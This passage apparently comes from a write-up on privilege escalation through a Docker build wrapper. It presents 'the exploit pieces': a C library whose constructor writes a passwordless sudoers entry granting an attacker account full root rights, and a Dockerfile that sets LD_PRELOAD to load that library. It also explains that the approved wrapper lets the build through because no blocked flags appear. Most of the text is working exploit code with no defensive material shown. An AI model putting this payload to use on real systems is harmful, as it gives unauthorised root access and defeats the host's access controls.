## The Exploit Pieces

The attacker needs three small things. First, a tiny malicious library with a constructor that grants them root:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
static void init(void) {
    unsetenv("LD_PRELOAD");   // prevent recursive loading
    FILE *f = fopen("/etc/sudoers.d/escalate", "w");
    if (f) {
        fprintf(f, "attacker ALL=(ALL) NOPASSWD: ALL\n");
        fclose(f);
    }
}
```

Second, a three-line Dockerfile that plants the `LD_PRELOAD`:

```dockerfile
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/payload.so
ADD payload.so /
```

Third, they build and run it through the *approved* wrapper — which happily allows it because no blocked flags appear.
